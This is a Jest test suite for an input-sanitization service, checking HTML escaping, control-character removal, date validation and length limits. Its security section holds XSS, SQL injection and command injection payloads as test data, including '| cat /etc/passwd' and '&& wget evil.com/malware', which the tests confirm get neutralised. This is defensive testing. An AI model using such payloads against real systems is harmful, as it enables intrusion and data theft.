/**
 * Sanitization Service Tests
 * Comprehensive test suite for input sanitization and security
 */

import { SanitizationService } from '../sanitizer';

describe('SanitizationService', () => {
  let sanitizer: SanitizationService;

  beforeEach(() => {
    sanitizer = SanitizationService.getInstance();
  });

  describe('Text Sanitization', () => {
    test('should trim whitespace by default', () => {
      const result = sanitizer.sanitizeText('  hello world  ');
      expect(result).toBe('hello world');
    });

    test('should preserve whitespace when requested', () => {
      const result = sanitizer.sanitizeText('  hello world  ', { trimWhitespace: false });
      expect(result).toBe('  hello world  ');
    });

    test('should escape HTML by default', () => {
      const result = sanitizer.sanitizeText('<script>alert("xss")</script>');
      expect(result).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;');
    });

    test('should apply length limits', () => {
      const result = sanitizer.sanitizeText('this is a very long string', { maxLength: 10 });
      expect(result).toBe('this is a ');
      expect(result.length).toBe(10);
    });

    test('should remove control characters', () => {
      const result = sanitizer.sanitizeText('hello\x00\x01world\x7F');
      expect(result).toBe('helloworld');
    });

    test('should normalize unicode', () => {
      // Using a unicode string that can be normalized
      const input = 'café'; // This might have different unicode representations
      const result = sanitizer.sanitizeText(input);
      expect(result).toBe('café');
    });
  });

  describe('HTML Sanitization', () => {
    test('should remove script tags', () => {
      const input = '<p>Hello</p><script>alert("xss")</script><p>World</p>';
      const result = sanitizer.sanitizeHtml(input);
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('alert');
      expect(result).toContain('<p>Hello</p>');
      expect(result).toContain('<p>World</p>');
    });

    test('should remove event handlers', () => {
      const input = '<div onclick="alert(\'xss\')" onmouseover="malicious()">Content</div>';
      const result = sanitizer.sanitizeHtml(input);
      expect(result).not.toContain('onclick');
      expect(result).not.toContain('onmouseover');
      expect(result).toContain('Content');
    });

    test('should remove javascript URLs', () => {
      const input = '<a href="javascript:alert(\'xss\')">Link</a>';
      const result = sanitizer.sanitizeHtml(input);
      expect(result).not.toContain('javascript:');
    });

    test('should remove data URLs', () => {
      const input = '<img src="data:text/html,<script>alert(\'xss\')</script>">';
      const result = sanitizer.sanitizeHtml(input);
      expect(result).not.toContain('data:');
    });

    test('should remove dangerous tags', () => {
      const input = '<iframe src="evil.com"></iframe><object data="evil.swf"></object>';
      const result = sanitizer.sanitizeHtml(input);
      expect(result).not.toContain('<iframe');
      expect(result).not.toContain('<object');
    });
  });

  describe('HTML Escaping', () => {
    test('should escape all HTML special characters', () => {
      const input = '<>&"\'\/';
      const result = sanitizer.escapeHtml(input);
      expect(result).toBe('&lt;&gt;&amp;&quot;&#x27;/');
    });

    test('should handle empty strings', () => {
      const result = sanitizer.escapeHtml('');
      expect(result).toBe('');
    });

    test('should handle non-string input', () => {
      const result = sanitizer.escapeHtml(null as any);
      expect(result).toBe('');
    });
  });

  describe('Control Character Removal', () => {
    test('should remove null bytes and other control characters', () => {
      const input = 'hello\x00\x01\x02world\x1F\x7F';
      const result = sanitizer.removeControlCharacters(input);
      expect(result).toBe('helloworld');
    });

    test('should preserve tab, newline, and carriage return', () => {
      const input = 'hello\t\n\rworld';
      const result = sanitizer.removeControlCharacters(input);
      expect(result).toBe('hello\t\n\rworld');
    });
  });

  describe('Unicode Normalization', () => {
    test('should normalize unicode characters', () => {
      // Test with a string that has different unicode representations
      const input = 'café'; // Could be composed or decomposed
      const result = sanitizer.normalizeUnicode(input);
      expect(result).toBe('café');
      expect(typeof result).toBe('string');
    });

    test('should handle normalization errors gracefully', () => {
      // Mock normalize to throw an error
      const originalNormalize = String.prototype.normalize;
      String.prototype.normalize = jest.fn(() => {
        throw new Error('Normalization failed');
      });

      const result = sanitizer.normalizeUnicode('test');
      expect(result).toBe('test'); // Should return original on error

      // Restore original method
      String.prototype.normalize = originalNormalize;
    });
  });

  describe('Special Character Sanitization', () => {
    test('should sanitize dangerous characters', () => {
      const input = '<script>alert("xss")</script>';
      const result = sanitizer.sanitizeSpecialCharacters(input);
      expect(result).not.toContain('<');
      expect(result).not.toContain('>');
      expect(result).not.toContain('"');
    });

    test('should allow specified characters', () => {
      const input = 'hello<world>';
      const result = sanitizer.sanitizeSpecialCharacters(input, ['<', '>']);
      expect(result).toBe('hello<world>');
    });

    test('should handle empty allowed characters', () => {
      const input = 'test&<>"\'';
      const result = sanitizer.sanitizeSpecialCharacters(input, []);
      expect(result).toBe('test&amp&lt&gt&quot&#x27');
    });
  });

  describe('Date Validation and Sanitization', () => {
    test('should validate and sanitize valid ISO date', () => {
      const input = '2024-12-25T10:30:00.000Z';
      const result = sanitizer.validateAndSanitizeDate(input, { format: 'ISO' });
      expect(result.isValid).toBe(true);
      expect(result.sanitizedDate).toBeDefined();
    });

    test('should reject invalid ISO format', () => {
      const input = '2024-12-25 10:30:00';
      const result = sanitizer.validateAndSanitizeDate(input, { format: 'ISO' });
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('ISO format');
    });

    test('should validate future dates', () => {
      const futureDate = new Date(Date.now() + 86400000).toISOString(); // Tomorrow
      const result = sanitizer.validateAndSanitizeDate(futureDate, { futureOnly: true });
      expect(result.isValid).toBe(true);
    });

    test('should reject past dates when future only', () => {
      const pastDate = new Date(Date.now() - 86400000).toISOString(); // Yesterday
      const result = sanitizer.validateAndSanitizeDate(pastDate, { futureOnly: true });
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('future');
    });

    test('should validate past dates', () => {
      const pastDate = new Date(Date.now() - 86400000).toISOString(); // Yesterday
      const result = sanitizer.validateAndSanitizeDate(pastDate, { pastOnly: true });
      expect(result.isValid).toBe(true);
    });

    test('should reject future dates when past only', () => {
      const futureDate = new Date(Date.now() + 86400000).toISOString(); // Tomorrow
      const result = sanitizer.validateAndSanitizeDate(futureDate, { pastOnly: true });
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('past');
    });

    test('should validate date ranges', () => {
      const minDate = new Date('2024-01-01');
      const maxDate = new Date('2024-12-31');
      const validDate = '2024-06-15T12:00:00.000Z';
      
      const result = sanitizer.validateAndSanitizeDate(validDate, { minDate, maxDate });
      expect(result.isValid).toBe(true);
    });

    test('should reject dates outside range', () => {
      const minDate = new Date('2024-01-01');
      const maxDate = new Date('2024-12-31');
      const invalidDate = '2023-06-15T12:00:00.000Z'; // Before min date
      
      const result = sanitizer.validateAndSanitizeDate(invalidDate, { minDate, maxDate });
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('after');
    });

    test('should handle invalid date strings', () => {
      const result = sanitizer.validateAndSanitizeDate('not-a-date');
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('Invalid date');
    });

    test('should handle empty date strings', () => {
      const result = sanitizer.validateAndSanitizeDate('');
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('non-empty string');
    });
  });

  describe('Length Limits', () => {
    test('should apply simple length limit', () => {
      const input = 'this is a long string';
      const result = sanitizer.applyLengthLimit(input, 10, false);
      expect(result).toBe('this is a ');
      expect(result.length).toBe(10);
    });

    test('should truncate at word boundary', () => {
      const input = 'this is a long string';
      const result = sanitizer.applyLengthLimit(input, 12, true);
      expect(result).toBe('this is a'); // Truncated at word boundary
    });

    test('should not truncate if word boundary is too far back', () => {
      const input = 'supercalifragilisticexpialidocious';
      const result = sanitizer.applyLengthLimit(input, 20, true);
      expect(result.length).toBe(20); // Should truncate normally since no good word boundary
    });

    test('should handle strings shorter than limit', () => {
      const input = 'short';
      const result = sanitizer.applyLengthLimit(input, 10, true);
      expect(result).toBe('short');
    });
  });

  describe('Pattern Validation', () => {
    test('should validate matching patterns', () => {
      const pattern = /^[a-zA-Z0-9]+$/;
      const result = sanitizer.validatePattern('hello123', pattern);
      expect(result.isValid).toBe(true);
      expect(result.sanitizedValue).toBe('hello123');
    });

    test('should reject non-matching patterns', () => {
      const pattern = /^[a-zA-Z0-9]+$/;
      const result = sanitizer.validatePattern('hello@world', pattern, false);
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('pattern');
    });

    test('should attempt sanitization on pattern failure', () => {
      const pattern = /^[a-zA-Z0-9]+(\s[a-zA-Z0-9]+)*$/; // No leading/trailing spaces
      const result = sanitizer.validatePattern('  hello world  ', pattern, true);
      expect(result.isValid).toBe(true);
      expect(result.sanitizedValue).toBe('hello world'); // Trimmed to match pattern
    });
  });

  describe('Comprehensive Text Field Sanitization', () => {
    test('should sanitize all string fields', () => {
      const data = {
        title: '  <script>alert("xss")</script>  ',
        description: 'Normal text with\x00control chars',
        number: 42,
        tags: ['  tag1  ', '<script>tag2</script>', 'tag3']
      };

      const result = sanitizer.sanitizeAllTextFields(data);
      
      expect(result.title).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;');
      expect(result.description).toBe('Normal text withcontrol chars');
      expect(result.number).toBe(42); // Non-string preserved
      expect(result.tags).toEqual(['tag1', '&lt;script&gt;tag2&lt;/script&gt;', 'tag3']);
    });

    test('should apply field-specific length limits', () => {
      const data = {
        title: 'this is a very long title that exceeds limits',
        description: 'short desc'
      };

      const fieldLimits = {
        title: 20,
        description: 100
      };

      const result = sanitizer.sanitizeAllTextFields(data, fieldLimits);
      
      expect(result.title.length).toBe(20);
      expect(result.description).toBe('short desc'); // Under limit
    });
  });

  describe('Edge Cases', () => {
    test('should handle null and undefined inputs', () => {
      expect(sanitizer.sanitizeText(null as any)).toBe('');
      expect(sanitizer.sanitizeText(undefined as any)).toBe('');
      expect(sanitizer.escapeHtml(null as any)).toBe('');
      expect(sanitizer.removeControlCharacters(null as any)).toBe('');
    });

    test('should handle non-string inputs gracefully', () => {
      expect(sanitizer.sanitizeText(123 as any)).toBe('');
      expect(sanitizer.sanitizeText({} as any)).toBe('');
      expect(sanitizer.sanitizeText([] as any)).toBe('');
    });

    test('should handle empty strings', () => {
      expect(sanitizer.sanitizeText('')).toBe('');
      expect(sanitizer.escapeHtml('')).toBe('');
      expect(sanitizer.removeControlCharacters('')).toBe('');
    });

    test('should handle very long strings', () => {
      const longString = 'a'.repeat(10000);
      const result = sanitizer.sanitizeText(longString, { maxLength: 100 });
      expect(result.length).toBe(100);
    });
  });

  describe('Security Tests', () => {
    test('should prevent XSS attacks', () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(\'xss\')">',
        '<svg onload="alert(\'xss\')">',
        '<iframe src="javascript:alert(\'xss\')"></iframe>'
      ];

      xssPayloads.forEach(payload => {
        const result = sanitizer.sanitizeText(payload);
        expect(result).not.toContain('<script');
        // Note: HTML tags are escaped, making them safe
        expect(result).not.toContain('<img');
        expect(result).not.toContain('<svg');
        expect(result).not.toContain('<iframe');
        // Verify dangerous content is escaped
        expect(result).toContain('&lt;');
        expect(result).toContain('&gt;');
      });
    });

    test('should prevent SQL injection patterns', () => {
      const sqlPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --"
      ];

      sqlPayloads.forEach(payload => {
        const result = sanitizer.sanitizeText(payload);
        // Should escape quotes and other dangerous characters
        expect(result).not.toContain("'");
        expect(result).toContain('&#x27;'); // Escaped single quote
      });
    });

    test('should prevent command injection', () => {
      const commandPayloads = [
        '| cat /etc/passwd',
        '&& wget evil.com/malware',
        '`whoami`',
        '$(id)'
      ];

      commandPayloads.forEach(payload => {
        const result = sanitizer.sanitizeSpecialCharacters(payload);
        expect(result).not.toContain('|');
        expect(result).not.toContain('`');
        expect(result).not.toContain('$');
        // & is escaped to &amp;
        if (payload.includes('&')) {
          expect(result).toContain('&amp;');
        }
      });
    });
  });
});